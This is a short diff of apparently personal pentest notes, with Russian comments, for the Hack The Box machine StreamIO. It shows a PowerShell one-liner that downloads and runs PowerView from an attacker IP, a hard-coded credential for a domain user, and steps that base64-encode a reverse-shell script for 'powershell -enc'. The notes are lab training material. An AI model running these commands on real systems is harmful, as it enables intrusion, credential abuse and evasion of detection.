@@ -16,3 +16,9 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.14.15/PowerView.ps1')
  $SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd',
 $SecPassword)
+
+# Кодирование скриптов POwerShell
+
+cat rev.ps1 |iconv -t UTF-16LE | base64 -w 0 (вывод)
+
+powershell -enc (вывод)
